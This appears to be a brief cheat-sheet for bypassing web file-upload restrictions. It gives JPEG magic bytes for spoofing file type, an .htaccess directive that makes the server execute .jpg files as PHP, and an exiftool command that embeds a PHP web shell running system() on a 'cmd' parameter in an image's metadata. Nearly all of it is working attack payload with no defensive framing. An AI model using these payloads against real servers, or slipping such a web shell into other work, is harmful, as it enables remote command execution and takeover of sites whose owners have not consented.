Jpg image header

```
FF D8 FF EE
```

.htaccess bypass:

```
AddType application/x-httpd-php .jpg
```

Manipulating image metadata:

```
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' lol.jpeg
```
